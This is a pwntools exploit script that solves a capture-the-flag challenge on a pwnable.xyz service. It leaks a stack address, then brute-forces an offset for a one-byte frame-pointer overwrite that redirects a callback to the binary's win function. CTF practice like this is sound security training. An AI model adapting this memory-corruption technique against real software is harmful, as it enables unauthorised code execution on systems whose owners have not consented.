from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe
context.log_level = "critical"

HOST = "svc.pwnable.xyz"
PORT = 30012

gdbscript = """
set follow-fork-mode child
# b *main+72
b *read_int8+25
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

STACK = 0

def leak_stack(r):
    r.sendlineafter(b"> ", b"3")

    global STACK
    STACK = int(r.recvline()[2:], 16)
    log.success(f"LEAKED STACK: {hex(STACK)}")

def overwrite_callback(r):
    rbp = STACK - CALLBACK_OFF
    win = str((exe.symbols.win + 1) & 0xff).encode().ljust(32, b"\x00")
    
    r.sendafter(b"> ", win + bytes({rbp & 0xff}))
    # print(f"RBP SHOULD BE {hex(rbp)}")

def restore_stack(r):
    rbp = STACK - ORIGINAL_OFF
    r.sendafter(b"> ", b"1" + b"\x00" * 31 + bytes({rbp & 0xff}))
    
def main():
    for i in range(0x80, 0x200):
        r  = conn()

        global CALLBACK_OFF
        CALLBACK_OFF = i

        global ORIGINAL_OFF
        ORIGINAL_OFF = CALLBACK_OFF + 9
        
        leak_stack(r)
        overwrite_callback(r)
        restore_stack(r)

        line = r.recv()
        print(line)
        if b"FLAG" in line:
            print(i)
            break 
            
        r.close()
        
if __name__ == "__main__":
    main()
